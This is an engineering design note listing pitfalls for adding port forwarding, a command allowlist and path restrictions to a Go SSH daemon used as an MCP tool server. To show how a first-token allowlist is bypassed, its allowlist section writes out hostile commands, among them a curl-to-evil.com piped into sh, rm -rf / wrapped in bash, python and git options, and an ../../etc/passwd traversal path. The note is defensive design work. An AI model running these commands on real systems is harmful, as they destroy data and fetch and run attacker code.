# Domain Pitfalls: Port Forwarding + Access Controls Milestone

**Domain:** Go SSH daemon — adding local port forwarding, command allowlist, base_dir, multi-host port namespacing
**Researched:** 2026-06-04
**Confidence:** HIGH (verified against codebase + official sources)

---

## Critical Pitfalls

### Pitfall 1: Port Forward Process Orphaning on Ungraceful Daemon Exit

**What goes wrong:**
`ssh -L` launched via `exec.Cmd` survives daemon exit unless explicitly killed. If the daemon is `kill -9`-ed, or panics, or exits before its deferred cleanup runs, the `ssh -L` child process keeps its local port bound. The next daemon start fails to bind the same port with `EADDRINUSE`.

**Why it happens:**
`os/exec` does not set a death signal by default. The child's parent PID changes to `init`/`launchd` (reparented). The OS-level port socket stays open as long as the process lives.

**Consequences:**
- Stale forward occupies the local port until the user finds and kills the orphan manually.
- `kill_forward` MCP tool returns success (the tracking struct is gone) but the port is still bound.
- Subsequent `start_forward` for the same local port returns `EADDRINUSE`.

**Prevention:**
Set `Pdeathsig: syscall.SIGTERM` (Linux) in `cmd.SysProcAttr` before starting the forward process. On macOS, `Pdeathsig` is not available — use a process group: `cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}` and send `syscall.SIGTERM` to `-pgid` on cleanup. Combine with the daemon's existing graceful shutdown (the drain path in `daemon.Run`) to call each active forward's `Stop()` before the drain timeout fires.

**Detection:**
After daemon exit, run `lsof -nP -iTCP -sTCP:LISTEN | grep <local_port>` — if the port is still bound to `ssh`, an orphan exists.

---

### Pitfall 2: `ssh -O forward` vs `ssh -L` — Forward Dies Silently When Master Exits

**What goes wrong:**
If the implementation uses `ssh -O forward` (adds a channel to the existing ControlMaster instead of spawning a new process), the forward is tied to the ControlMaster lifetime. When the user runs `ssh -O exit` or the master dies, the forwarded port stops accepting connections with no error returned to the daemon or to Claude. The `ssh_forward_status` tool reports "active" because the daemon's in-memory state still shows the forward as running — but the local port is actually dead.

**Why it happens:**
`ssh -O forward` multiplexes through the master's existing TCP connection. There is no child process to monitor for liveness — the forward is a channel allocation inside the master. When the master exits, all channels vanish simultaneously.

**If using `ssh -L` instead:** The forward is a separate process. The daemon can watch `cmd.Wait()` in a goroutine and mark the forward dead when the process exits. This is the correct approach for this daemon because the ControlMaster lifecycle is explicitly user-managed, and the daemon already uses `os/exec ssh -S` for all other operations.

**Prevention:**
Use `ssh -L -S <socket> -N` (a separate long-running process that still multiplexes through the ControlMaster) rather than `ssh -O forward`. Monitor the process in a goroutine via `cmd.Wait()` and update the forward's state to "died" when it exits. Expose this state through `ssh_forward_status`. This gives the daemon observable process-level liveness, decoupled from the ControlMaster's internal channel state.

**Detection:**
Forward appears "active" in status but `nc -z localhost <port>` fails immediately.

---

### Pitfall 3: Race Between Forward Startup and First Connection Attempt

**What goes wrong:**
`ssh -L` binds the local port after the SSH handshake completes. The `start_forward` tool returns success as soon as `cmd.Start()` returns — but the port is not yet listening. Claude (or a subsequent MCP tool call) immediately attempts to connect and gets `ECONNREFUSED`.

**Why it happens:**
`cmd.Start()` returns when the OS has created the child process, not when `ssh` has completed authentication and called `bind()` on the local port. On a slow or high-latency ControlMaster connection, this gap can be 500ms–2s.

**Consequences:**
Claude gets a confusing "connection refused" that looks like the forward failed, when it actually just needs a moment.

**Prevention:**
After `cmd.Start()`, poll `net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))` in a loop with a short sleep (50ms) up to a bounded timeout (3–5s). Return success from `start_forward` only when the port is actually accepting connections. Distinguish "timeout waiting for port to open" (forward startup failure) from "port accepted connection" (ready).

**Detection:**
`start_forward` succeeds but first use fails; retry succeeds 1–2 seconds later.

---

### Pitfall 4: Command Allowlist Bypass via Shell Wrapping

**What goes wrong:**
A per-host command allowlist that checks the first token of `in.Command` is trivially bypassed:
- `bash -c 'rm -rf /'` — first token is `bash`, not `rm`
- `sh -c 'curl http://evil.com | sh'`
- `sudo rm -rf /`
- `env RM=1 bash`
- `python3 -c 'import os; os.system("rm -rf /")'`

The existing `isDestructiveCommand` in `safeguards.go` already documents this limitation explicitly: *"Shell wrappers such as 'sudo rm', 'bash -c rm' are NOT blocked."*

**Why it happens:**
The command string passed to `ssh -S socket user@host <command>` is executed by the remote shell (`/bin/sh` or the user's `$SHELL`). There is no way to sanitize a freeform shell command string reliably. First-token allowlisting only stops naive direct invocations.

**Consequences:**
The allowlist gives a false sense of security. A user or Claude who believes `git` is the only allowed command will be surprised that `git config --upload-pack='rm -rf / #'` passes the check.

**Prevention:**
Document the allowlist as a coarse-grained filter that blocks clearly prohibited commands, not a security boundary. Add a configuration comment warning that shell interpreters (`bash`, `sh`, `python3`, `perl`, `ruby`, `node`, `awk`, `sed`) should be explicitly listed as denied if the intent is restriction. Do not describe the allowlist in tool descriptions as a "security control" — use "policy filter." For stricter use cases, point users to `restricted-shell` (rbash) or `ForceCommand` in `sshd_config` on the remote side, which enforce constraints at the server level where they cannot be bypassed from the client.

**Detection:**
Test: if `bash` is not in the allowlist but `bash -c 'echo hello'` succeeds, the allowlist is first-token-only.

---

### Pitfall 5: Empty Allowlist Semantics — Allow-All vs. Deny-All Footgun

**What goes wrong:**
When `allow_commands` is absent or an empty list in the host config, the implementation must choose: allow all commands (treat empty as "no restriction") or deny all commands (treat empty as "nothing permitted"). The wrong default is a serious footgun:
- **Allow-all default:** A user who adds `"allow_commands": []` intending to lock down a host gets unrestricted exec instead.
- **Deny-all default:** A user who omits the field entirely (upgrading from a config before the feature existed) suddenly finds all exec blocked.

**Why it happens:**
Go's zero value for a slice is `nil`, which is indistinguishable from `[]string{}` after JSON decode of an absent field vs. `"allow_commands": []`. Both marshal to a nil slice.

**Prevention:**
Use a pointer to distinguish absent from present: `AllowCommands *[]string json:"allow_commands,omitempty"`. When `nil` (absent): allow all (backward-compatible default). When non-nil but empty (`[]`): deny all (explicit lockdown). Document this explicitly in config comments and the tool description. Add a `config.Validate()` check that logs a warning when `AllowCommands` is non-nil and empty, making the deny-all intent visible at startup.

**Detection:**
`"allow_commands": []` with `exec` capability enabled — does `ssh_exec` succeed or fail?

---

### Pitfall 6: `base_dir` Path Traversal via `..` and Symlinks

**What goes wrong:**
A remote path like `/home/user/projects/../../etc/passwd` traverses outside `base_dir`. Even after `filepath.Clean`, a symlink at `/home/user/projects/link -> /etc` escapes the check because `filepath.Clean` only normalizes lexically — it does not resolve symlinks. The `strings.HasPrefix` check is additionally unsafe because `/home/user-other` passes a check against `/home/user`.

**Why it happens:**
Path validation on paths that will be used remotely is intrinsically limited: the daemon cannot use `os.Root` (Go 1.24's traversal-safe API) because `os.Root` opens a local file descriptor, but the files are on the remote host. The only reliable containment is to reject paths that are not absolute, reject paths containing `..` components after normalization, and accept that symlink resolution requires a remote `realpath` call.

**Prevention:**
Three-layer defense:
1. **Reject relative paths**: if `!filepath.IsAbs(remotePath)`, error immediately.
2. **Lexical normalization**: `cleaned := filepath.Clean(remotePath)`. If `!strings.HasPrefix(cleaned+"/", baseDir+"/")` (note the trailing slash on both sides to prevent the `/home/user-other` false-pass), reject.
3. **Optional remote realpath**: run `ssh -S socket user@host realpath --canonicalize-missing <path>` and apply the prefix check to the result. This catches symlink escapes but adds one extra SSH round-trip per operation. Flag this as a phase option — do it only when `base_dir` is configured.

The `strings.HasPrefix` partial-match bug is avoided by appending `/` to the base before comparing: `strings.HasPrefix(cleaned+"/", filepath.Clean(baseDir)+"/")`.

**Detection:**
Test: `../../etc/passwd` rooted at `/tmp/jail` should be rejected. `/tmp/jail-other/file` should be rejected.

---

### Pitfall 7: `exec` Cwd vs. File Path — Different Semantic Layers

**What goes wrong:**
`base_dir` is applied to file paths (read, write, upload, download). The `exec` tool's `cwd` parameter sets the working directory for the remote command. These are different things. A user configures `base_dir: /srv/app` expecting it to restrict exec to that directory, but `ssh_exec` with `cwd: /etc` still works because `base_dir` was only applied to file tools.

Conversely, if `base_dir` is also checked against `cwd` in exec, users cannot `cd` into a subdirectory of a project for contextual commands.

**Why it happens:**
The two restrictions have different purposes but are easy to conflate in config design: "path restriction" reads as "I can only touch things under X" but exec `cwd` is a separate concept.

**Prevention:**
Decide and document the semantics explicitly:
- `base_dir` restricts: file read, file write, upload remote path, download remote path.
- `base_dir` does NOT restrict: `exec` cwd (exec is separately controlled by `allow_commands`).
- If cwd restriction is wanted, it requires a separate `cwd_restrict` field or a note in the config schema.

Make this explicit in the tool descriptions: "base_dir restricts file operations; use allow_commands to restrict which executables are permitted."

**Detection:**
`ssh_exec` with `cwd: /etc` succeeds even when `base_dir: /srv/app` is set.

---

## Moderate Pitfalls

### Pitfall 8: Multi-Host Port Namespace Collision

**What goes wrong:**
Host `prod` has a forward rule `local: 5432 → remote: 5432`. Host `staging` also wants `local: 5432 → remote: 5432`. The second `start_forward` call fails because `127.0.0.1:5432` is already bound by the first. The error message says "address already in use" with no indication of which other host owns the port.

**Prevention:**
Maintain a daemon-level port registry (`map[int]string`, local port → host name) protected by a mutex. Before starting any forward, check whether the local port is claimed. Return a clear error: `"local port 5432 already allocated to host prod"`. This check must happen under the same lock as the registry update — do not check then allocate in two separate steps.

**Detection:**
Start two forwards for different hosts with the same local port — second should fail with a meaningful error, not a raw `EADDRINUSE` bubbling up from ssh stderr.

---

### Pitfall 9: Forward Orphaning When Host Is Removed from Config

**What goes wrong:**
A forward is started for host `dev`. The user edits the config and removes the `dev` entry. The daemon does not reload config (there is no SIGHUP handler). The forward process keeps running with its port still bound. There is no way to stop it via `kill_forward` because the host is no longer in the registry — the tool cannot resolve the executor.

**Why it happens:**
The daemon builds the executor registry once at startup from `cfg.Hosts`. Forwards have a lifetime decoupled from config reloads.

**Prevention:**
The forward registry must be indexed by (host name, local port), not by executor lookup. `kill_forward` must look up the forward by its tracking key, not by re-resolving the host executor. Store the forward's tracking struct (process handle, local port, host name) in a separate map owned by the forward manager. This map persists even if the executor registry changes. Additionally, document that removing a host from config while a forward is active requires manually killing the forward first.

**Detection:**
Start a forward, remove the host from config, attempt to stop the forward — does `kill_forward` find it or return "unknown host"?

---

### Pitfall 10: `allow_commands` Case Sensitivity

**What goes wrong:**
The allowlist contains `"Git"` but the command is `git status`. String comparison is case-sensitive by default in Go. The command is blocked. Conversely, if comparison is made case-insensitive, `GIT` in the command is allowed when `git` is listed.

**Why it happens:**
`strings.EqualFold` vs. `==` is a one-character difference that is easy to miss.

**Prevention:**
Normalize both the allowlist entries and the extracted first token to lowercase before comparison. Document that all allowlist entries must be lowercase. Use `strings.ToLower(filepath.Base(fields[0]))` for the command token.

---

### Pitfall 11: `allow_commands` Matches Command Name, Not Full Path

**What goes wrong:**
The allowlist contains `"git"`. The remote user invokes `/usr/local/bin/git status` — this is different from `git status` at the string level. Or the attacker uses a malicious binary named `git` earlier in `$PATH`.

**Why it happens:**
The existing `isDestructiveCommand` uses `filepath.Base(fields[0])` which correctly extracts the basename. If `allow_commands` uses full-string matching against `in.Command` rather than basename extraction, `/usr/local/bin/git` does not match `"git"`.

**Prevention:**
Extract the basename with `filepath.Base(fields[0])` before checking the allowlist — consistent with how `isDestructiveCommand` works today. Document that allowlist entries are basenames only; `/usr/local/bin/git` in the allowlist is not supported and will never match.

---

## Minor Pitfalls

### Pitfall 12: Adding New MCP Tools Breaks Existing Claude Code Session

**What goes wrong:**
Claude Code performs capability negotiation (`initialize` + `tools/list`) at session start and caches the result. When new tools are added (`ssh_start_forward`, `ssh_stop_forward`, `ssh_forward_status`) and the daemon is restarted, the existing Claude Code session does not see them. Claude attempts to call a tool that was not in the original `tools/list` and gets an error, or silently fails.

**Why it happens:**
MCP tools are discovered at `initialize` time, not dynamically during a session. The `go-sdk` does send `notifications/tools/list_changed` when tools are added while a session is active (confirmed: `go-sdk` sends the notification when `mcp.AddTool` is called after connection). However, Claude Code's response to this notification (whether it re-fetches `tools/list`) depends on the Claude Code client version.

**Prevention:**
Require the user to restart Claude Code after enabling `port_forward: true` in the config and restarting the daemon. Document this in the tool description and in error messages. Do not attempt dynamic tool registration after session start — tools are registered in `RegisterTools` before `acceptLoop` begins, consistent with the existing "must register before accept" pattern (Pitfall 3 in `register.go`).

**Detection:**
Enable `port_forward` in config, restart daemon, attempt to call `ssh_start_forward` without restarting Claude Code — check whether the call succeeds or returns "unknown tool."

---

### Pitfall 13: `ssh -L` stderr Parsing for Startup Errors

**What goes wrong:**
When `ssh -L` fails to bind the local port (EADDRINUSE, permission denied on port <1024), it writes the error to stderr and exits with code 255. The daemon sees a non-zero exit from the startup poll and returns a generic error. The actual cause (port conflict, permission denied) is buried in stderr.

**Prevention:**
Capture `cmd.Stderr` into a buffer. Include the first 200 bytes of stderr in the error returned from `start_forward` when the process exits unexpectedly during startup or the port-readiness poll times out. Pattern: `fmt.Errorf("ssh -L failed: %s", strings.TrimSpace(stderrBuf.String()))`.

---

### Pitfall 14: `base_dir` Trailing Slash Normalization

**What goes wrong:**
Config has `base_dir: "/srv/app/"` (trailing slash). Code does `filepath.Clean(baseDir)` → `/srv/app`. Check: `strings.HasPrefix(cleanedPath+"/", baseDir+"/")` → `strings.HasPrefix("/srv/app/secret", "/srv/app//")` — double slash, check passes incorrectly on some edge cases, or fails when it should pass.

**Prevention:**
Always `filepath.Clean` the `base_dir` value at config validation time, not at use time. Store the cleaned form. The check then becomes `strings.HasPrefix(filepath.Clean(remotePath)+"/", cleanedBaseDir+"/")` with no double-slash risk.

---

### Pitfall 15: Global `capabilities.port_forward` Toggle vs. Per-Host Forward Rules

**What goes wrong:**
`port_forward: true` is a global capability toggle. If the intent is to allow forwarding for `staging` but not `prod`, there is no per-host capability gate. Any call to `ssh_start_forward` with `host: prod` succeeds.

**Prevention:**
Document at the config design stage: capability toggles are global in the current architecture (consistent with D-06/D-07 which keep safeguards and capabilities global). Per-host forwarding restrictions, if needed, require a separate per-host `allow_forward` field in `HostConfig` — flag this as a future enhancement, not an MVP requirement. Do not silently allow the per-host case by default.

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|---|---|---|
| `start_forward` tool implementation | Pitfall 3 (race between startup and first connection) | Implement port-readiness poll before returning success |
| `start_forward` process lifecycle | Pitfall 1 (orphan on ungraceful exit) + Pitfall 2 (silent death when master exits) | Use `ssh -L -S -N`, `cmd.Wait()` watcher goroutine, `Pdeathsig`/`Setpgid` |
| `kill_forward` tool | Pitfall 9 (orphan when host removed) | Index forward registry by tracking key, not executor lookup |
| Multi-host forward tracking | Pitfall 8 (port namespace collision) | Daemon-level port registry with mutex |
| `allow_commands` config field design | Pitfall 5 (empty-list semantics) | Use `*[]string` pointer to distinguish absent from empty |
| `allow_commands` enforcement in execHandler | Pitfall 4 (shell bypass) + Pitfall 10 (case) + Pitfall 11 (basename) | Document scope, normalize to lowercase, use filepath.Base |
| `base_dir` enforcement in file handlers | Pitfall 6 (traversal + symlink) + Pitfall 14 (trailing slash) | Three-layer defense, clean at validation time |
| `cwd` in ssh_exec with base_dir configured | Pitfall 7 (cwd vs path semantics) | Explicit documentation; do not apply base_dir to cwd |
| Enabling `port_forward` capability | Pitfall 12 (MCP negotiation) | Require Claude Code restart; document in tool description |
| Forward startup errors | Pitfall 13 (stderr swallowed) | Capture and surface stderr in error message |

## Sources

- Go official blog: `os.Root` traversal-safe API (Go 1.24+) — https://go.dev/blog/osroot
- OWASP OS Command Injection Defense Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- OpenSSH Cookbook: Multiplexing (ssh -O forward vs ssh -L lifetime) — https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing
- Go process group / Pdeathsig patterns — https://medium.com/@felixge/killing-a-child-process-and-all-of-its-children-in-go-54079af94773
- MCP lifecycle specification (tools/list at initialize time) — https://modelcontextprotocol.io/specification/2025-03-26/basic/lifecycle
- Existing codebase: `internal/tools/safeguards.go` (isDestructiveCommand first-token limitation, documented)
- Existing codebase: `internal/config/config.go` (nil vs empty map distinction, Pitfall 7 comment)
- Existing codebase: `internal/daemon/daemon.go` (drain timeout and graceful shutdown pattern to extend for forward cleanup)
- Existing codebase: `internal/ssh/executor.go` (shellescape, POSIX var validation patterns)
